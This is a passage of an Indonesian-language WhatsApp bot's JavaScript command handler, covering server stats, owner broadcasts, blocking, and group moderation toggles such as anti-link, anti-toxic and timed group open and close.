                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
◈ ━━━━━━━ 𝗜𝗡𝗙𝗢 𝗦𝗘𝗥𝗩𝗘𝗥 ━━━━━━━ ◈

🚨𝗞𝗲𝗰𝗲𝗽𝗮𝘁𝗮𝗻
${latensi.toFixed(4)} _Second_

⏲️𝗪𝗮𝗸𝘁𝘂 𝗔𝗸𝘁𝗶𝗳
${runtime(process.uptime())}

🖥️𝗥𝗔𝗠
${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

💾𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗠𝗲𝗺𝗼𝗿𝘆 𝗡𝗼𝗱𝗲𝗝𝘀
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `💽𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗝𝘂𝗺𝗹𝗮𝗵 𝗖𝗣𝗨
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcNFS(respon)
            }
            break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!NFSTheCreator) return NFSStickOwner()
		            if (!q) return replygcNFS(`Enter text`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               NFSBotInc.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!NFSTheCreator) return NFSStickOwner()
        if (!q) return replygcNFS(`Enter text`)
        let getGroups = await NFSBotInc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let NFScast = groups.map(v => v.id)
        replygcNFS(` Menyiarkan di ${NFScast.length} Obrolan Grup, di ${NFScast.length * 1.5} detik`)
        for (let i of NFScast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await NFSBotInc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await NFSBotInc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcNFS(`Berhasil Disiarkan di ${NFScast.length} Grup`)      
        break
case 'block': case 'ban': {
		if (!NFSTheCreator) return NFSStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await NFSBotInc.updateBlockStatus(users, 'block')
		await replygcNFS(`Done`)
	}
	break
        case 'unblock': case 'unban': {
		if (!NFSTheCreator) return NFSStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await NFSBotInc.updateBlockStatus(users, 'unblock')
		await replygcNFS(`Done`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcNFS(lisben)
	}
	break
case 'afk': {
if (!m.isGroup) return NFSStickGroup()
if (!text) return replygcNFS(`Contoh ${prefix+command} ingin tidur`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcNFS(`${m.pushName} Telah Pergi AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
NFSBotInc.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!NFSTheCreator) return NFSStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                NFSBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'editinfo': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!q) return replygcNFS(`Kirim pesanan ${command} _options_\nPilihan : open & close\nContoh : ${command} open`)
if (args[0] == 'close') {
NFSBotInc.groupSettingUpdate(from, 'announcement')
replygcNFS(`Sukses Mengizinkan Hanya Admin Yang Mengirim Pesan Ke Grup Ini`)
} else if (args[0] == 'open') {
NFSBotInc.groupSettingUpdate(from, 'not_announcement')
replygcNFS(`Sukses Mengizinkan Semua Peserta Mengirim Pesan Ke Grup Ini`)
} else {
replygcNFS(`Ketik Perintah ${command} _pptions_\nPilihan : Close & Open\nContoh : ${command} close`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args.length < 1) return replygcNFS('ketik *autosticker on* untuk mengaktifkan\nketik *autosticker off* untuk menonaktifkan')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcNFS(`Telah diaktifkan`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcNFS('stiker otomatis diaktifkan')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcNFS('stiker otomatis dinonaktifkan')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (antiVirtex) return replygcNFS('Telah diaktifkan')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcNFS('Sukses menyalakan antivirus di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcNFS('Sudah dinonaktifkan')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcNFS('Sukses mematikan antivirus grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcNFS('Telah diaktifkan')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcNFS('Sukses menyalakan nsfw di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nFitur Nsfw (tidak aman untuk bekerja) telah diaktifkan di grup ini, yang berarti seseorang dapat mengakses grafik seksual dari bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcNFS('Sudah dinonaktifkan')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcNFS('Sukses mematikan nsfw di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcNFS('Telah diaktifkan')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcNFS('Sukses menyalakan antilink video youtube di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcNFS('Sukses mematikan antilink video youtube di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :*  ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcNFS('Telah diaktifkan')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcNFS('Sukses menyalakan antilink channel youtube di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan tautan saluran youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcNFS('Sukses mematikan antilink channel youtube di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcNFS('Telah diaktifkan')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcNFS('Sukses menyalakan antilink instagram di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link instagram di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcNFS('Sukses mematikan antilink instagram di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcNFS('Telah diaktifkan')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcNFS('Sukses menyalakan antilink facebook di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tautan facebook di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcNFS('Sukses mematikan antilink facebook di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcNFS('Telah diaktifkan')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcNFS('Sukses menyalakan antilink telegram di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link telegram di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcNFS('Sukses mematikan antilink telegram di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\nExample: ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcNFS('Telah diaktifkan')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcNFS('Sukses menyalakan antilink tiktok di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tautan tiktok di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcNFS('Sukses mematikan antilink tiktok di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcNFS('Telah diaktifkan')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcNFS('Sukses menyalakan antilink twitter di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tautan twitter di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcNFS('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcNFS('Sukses mematikan antilink twitter di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcNFS('Telah diaktifkan')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcNFS('Sukses mengaktifkan semua antilink di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tautan apa pun di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcNFS('Sudah dinonaktifkan')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcNFS('Sukses mematikan semua antilink di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (antiToxic) return replygcNFS('Telah diaktifkan')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcNFS('Sukses menyalakan anti toksik di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nTidak ada yang diperbolehkan menggunakan kata-kata buruk di grup ini, yang menggunakan akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcNFS('Sudah dinonaktifkan')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcNFS('Sukses mematikan anti toksik di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (antiWame) return replygcNFS('Telah diaktifkan')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcNFS('Sukses menyalakan antiwame di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcNFS('Sudah dinonaktifkan')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcNFS('Sukses mematikan antiwame di grup ini')
} else {
  await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (args[0] === "on") {
if (Antilinkgc) return replygcNFS('Telah diaktifkan')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcNFS('Sukses menyalakan antiwame di grup ini')
var groupe = await NFSBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NFSBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim tautan grup di grup ini, siapa pun yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcNFS('Sudah dinonaktifkan')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcNFS('Sukses mematikan antiwame di grup ini')
} else {
await replygcNFS(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
  }
  }
  break
   case 'leavegc': {
                if (!NFSTheCreator) return NFSStickOwner()
                await NFSBotInc.groupLeave(m.chat)
                await replygcNFS(`Done`)
            }
            break
case 'add': {
if (!m.isGroup) return NFSStickGroup()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!NFSTheCreator) return NFSStickOwner()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NFSBotInc.groupParticipantsUpdate(m.chat, [users], 'add')
await replygcNFS(`Done`)
}
break
case 'closetime': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcNFS('*Choose:*\nsecond\nminute\nhour\n\n*Contoh*\n10 second')
}
replygcNFS(`Tutup Waktu ${q} Mulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat waktu* Grup Ditutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
NFSBotInc.groupSettingUpdate(from, 'announcement')
replygcNFS(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return NFSStickGroup()
                if (!isBotAdmins) return NFSStickBotAdmin()
                if (!isAdmins) return NFSStickAdmin()
                if (!text) return replygcNFS('Masukkan nilainya enable/disable')
                if (args[0] === 'enable') {
                    await NFSBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                } else if (args[0] === 'disable') {
                    await NFSBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcNFS(`Done`)
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcNFS('Pesan tidak dikirim oleh bot!')
                 NFSBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return NFSStickGroup()
                if (!isBotAdmins) return NFSStickBotAdmin()
                let response = await NFSBotInc.groupInviteCode(m.chat)
                NFSBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcNFS('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcNFS(`Waktu Buka ${q} Mulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat waktu* Grup Dibuka Oleh Admin\nSekarang Anggota Bisa Kirim Pesan`
NFSBotInc.groupSettingUpdate(from, 'not_announcement')
replygcNFS(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NFSBotInc.groupParticipantsUpdate(m.chat, [users], 'remove')
await replygcNFS(`Done`)
}
break
case 'setbotname':{
if (!NFSTheCreator) return NFSStickOwner()
if (!text) return replygcNFS(`Dimana namanya?\n*Contoh :* ${prefix + command} NFS Bot`)
    await NFSBotInc.updateProfileName(text)
    replygcNFS(`Berhasil mengubah nama nomor bot`)
    }
    break
case 'setbotbio':{
if (!NFSTheCreator) return NFSStickOwner()
if (!text) return replygcNFS(`Dimana teksnya?\nContoh: ${prefix + command} NFS Bot`)
    await NFSBotInc.updateProfileStatus(text)
    replygcNFS(`Berhasil mengubah bio nomor bot`)
    }
    break
    case 'setgroupname': case 'setsubject': {
                if (!m.isGroup) return NFSStickGroup()
                if (!isBotAdmins) return NFSStickBotAdmin()
                if (!isAdmins) return NFSStickAdmin()
                if (!text) return replygcNFS('Text ?')
                await NFSBotInc.groupUpdateSubject(m.chat, text)
                await replygcNFS(`Done`)
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return NFSStickGroup()
                if (!isBotAdmins) return NFSStickBotAdmin()
                if (!isAdmins) return NFSStickAdmin()
                if (!text) return replygcNFS('Text ?')
                await NFSBotInc.groupUpdateDescription(m.chat, text)
                await replygcNFS(`Done`)
            }
            break
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
if (!quoted) return replygcNFS(`Mana gambarnya?`)
if (!/image/.test(mime)) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
var mediz = await NFSBotInc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
